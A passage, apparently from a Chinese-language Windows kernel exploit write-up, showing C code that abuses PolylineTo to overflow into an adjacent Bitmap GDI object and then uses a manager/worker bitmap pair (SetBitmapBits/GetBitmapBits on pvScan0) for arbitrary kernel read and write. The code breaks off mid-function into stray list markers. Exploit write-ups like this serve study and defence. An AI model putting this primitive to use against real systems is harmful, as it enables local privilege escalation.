        if (j > 0x1F && points[2].y != 0x5a1f) {
            points[2].y = 0x5a1f;
        }
        if (!PolylineTo(hMemDC, points, 0x3FE01)) {
            fprintf(stderr, "[!] PolylineTo() Failed: %x\r\n", GetLastError());
        }
    }
这样刚好覆盖下一页中 `Bitmap GDI Object` 中的 `hdev` 和 `sizlBitmap` 中的 `width` 属性
复制完成后
由于 `width` 覆盖为了 `0xffffffff` ，导致buffer的读写空间非常大，这时就能把这个 `object` 作为 `manager`
，下下一页中的 `Bitmap GDI Object` 作为 `worker` ，通过 `SetBitmapBits` 修改 `worker` 的
`pvScan0` 属性（相当于 buffer 地址）来设置想读写的地址，再对 `worker` 调用 `SetBitmapBits` 、
`GetBitmapBits` 来进行任意地址读写。
    void SetAddress(BYTE* address) {
        for (int i = 0; i 
  * 
  * 
  * 
  * 
  * 
* * *